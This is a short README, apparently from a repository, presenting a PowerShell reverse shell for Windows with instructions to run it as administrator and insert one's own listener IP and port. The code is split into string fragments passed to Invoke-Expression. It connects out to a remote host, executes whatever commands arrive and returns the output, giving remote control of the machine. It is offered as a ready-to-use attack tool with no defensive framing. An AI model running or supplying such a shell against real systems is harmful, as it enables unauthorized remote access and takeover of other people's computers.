# Revershell-PS1
Revershell for windows (you must run powershell as administrator)
Change the 0's to your ip and port listening

```
$a = "New-Object"
$b = "System.Net.Sockets.TCPClient"
$c = "$b('000.000.00.0',000)" 
$d = "$a $c"
$e = Invoke-Expression $d
$f = "$e.GetStream()"
$g = "[byte[]]"
$h = "$g(0..65535|%{0})"
$i = "while((($j = $f.Read($h, 0, $h.Length))) -ne 0){$k = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h,0, $j);$l = (Invoke-Expression $k 2>&1 | Out-String );$m  = $l + 'PS ' + (Get-Location).Path + '> ';$n = ([text.encoding]::ASCII).GetBytes($m);$f.Write($n,0,$n.Length);$f.Flush()};$e.Close()"
Invoke-Expression $i
```
